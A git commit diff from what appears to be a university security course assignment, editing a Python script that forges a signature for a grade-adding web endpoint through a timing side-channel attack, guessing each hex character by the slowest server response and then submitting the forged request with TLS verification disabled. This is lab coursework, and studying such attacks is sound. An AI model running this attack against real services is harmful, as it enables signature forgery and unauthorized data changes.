661eb8734982b99b1193cda84474c6c5207865fc
Jacob Bohlin <dat13jbo@varg-3.student.lth.se>
2017-12-09 20:41:18 +0100

    Finished HA4 B3

--- A4/B2.py
+++ A4/B2.py
@@ -1,7 +1,7 @@
 import requests
 
 
-url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature="
+url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Martin&grade=4&signature="
 chars = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"]
 times = [0] * 16
 
@@ -10,6 +10,9 @@ for j in range(20): # Signature length (20 hex characters)
         response = requests.get(url + chars[i], verify=False)
         times[i] = response.elapsed.total_seconds()
     url += chars[times.index(max(times))]
+    print(times)
     print(url[len(url) - 1:])
 
+
+print(url[len(url) - 21:])
 print(requests.get(url, verify=False).text)
